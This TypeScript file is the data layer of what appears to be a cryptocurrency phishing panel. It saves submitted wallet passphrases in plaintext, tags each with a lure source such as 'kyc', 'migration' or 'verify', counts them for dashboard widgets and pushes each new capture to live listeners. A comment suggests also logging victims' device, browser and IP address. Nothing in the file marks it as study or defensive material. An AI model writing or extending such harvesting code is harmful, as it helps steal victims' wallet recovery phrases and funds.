import fs from "fs";
import path from "path";

export interface WalletRecord {
  id: number;
  passphrase: string;
  source: string;
  createdAt: string; // ISO String
}

const DB_FILE = path.join(process.cwd(), "db.json");

// Helper to initialize DB file if it doesn't exist
function initDb() {
  if (!fs.existsSync(DB_FILE)) {
    fs.writeFileSync(DB_FILE, JSON.stringify([], null, 2));
  }
}

/**
 * Gets all wallet records from the database.
 */
export async function getWalletRecords(): Promise<WalletRecord[]> {
  initDb();
  try {
    const data = await fs.promises.readFile(DB_FILE, "utf-8");
    return JSON.parse(data) as WalletRecord[];
  } catch (error) {
    console.error("Error reading database:", error);
    return [];
  }
}

/**
 * Saves a new wallet record.
 */
export async function saveWalletRecord(
  passphrase: string,
  source: string
): Promise<WalletRecord> {
  initDb();
  const records = await getWalletRecords();
  
  const newRecord: WalletRecord = {
    id: records.length > 0 ? Math.max(...records.map((r) => r.id)) + 1 : 1,
    passphrase,
    source,
    createdAt: new Date().toISOString(),
  };

  records.push(newRecord);
  await fs.promises.writeFile(DB_FILE, JSON.stringify(records, null, 2), "utf-8");
  
  // Notify any active SSE listeners of a new insertion
  notifyListeners(newRecord);

  return newRecord;
}

/**
 * Gets statistical counts for dashboard widgets.
 */
export async function getStats() {
  const records = await getWalletRecords();
  const todayStr = new Date().toISOString().split("T")[0]; // YYYY-MM-DD

  let total = records.length;
  let today = 0;
  let wallet = 0;
  let verify = 0;
  let kyc = 0;
  let migration = 0;

  for (const record of records) {
    // Check if created today
    if (record.createdAt.startsWith(todayStr)) {
      today++;
    }

    // Source tracking
    const src = record.source.toLowerCase();
    if (src.includes("wallet")) {
      wallet++;
    } else if (src.includes("verify") || src.includes("transaction")) {
      verify++;
    } else if (src.includes("kyc")) {
      kyc++;
    } else if (src.includes("migration")) {
      migration++;
    }
  }

  return { total, today, wallet, verify, kyc, migration };
}

// SSE Broadcast / Real-time updates subscription system
type RecordListener = (record: WalletRecord) => void;
const listeners = new Set<RecordListener>();

export function subscribeToRecords(listener: RecordListener) {
  listeners.add(listener);
  return () => {
    listeners.delete(listener);
  };
}

function notifyListeners(record: WalletRecord) {
  listeners.forEach((listener) => {
    try {
      listener(record);
    } catch (e) {
      console.error("Error invoking SSE listener:", e);
    }
  });
}

/**
 * PRODUCTION NOTE:
 * To transition this database file system to PostgreSQL or MySQL, you can install 'pg' or 'mysql2'
 * and swap the file reads/writes above with standard SQL queries.
 *
 * Example using PostgreSQL (pg):
 * 
 * import { Pool } from 'pg';
 * const pool = new Pool({ connectionString: process.env.DATABASE_URL });
 * 
 * export async function getWalletRecords() {
 *   const res = await pool.query('SELECT * FROM wallet_records ORDER BY id DESC');
 *   return res.rows;
 * }
 * 
 * export async function saveWalletRecord(passphrase, source, device, browser, ipAddress) {
 *   const res = await pool.query(
 *     'INSERT INTO wallet_records (passphrase, source, device, browser, ip_address, created_at) VALUES ($1, $2, $3, $4, $5, NOW()) RETURNING *',
 *     [passphrase, source, device, browser, ipAddress]
 *   );
 *   const newRecord = res.rows[0];
 *   notifyListeners(newRecord);
 *   return newRecord;
 * }
 */
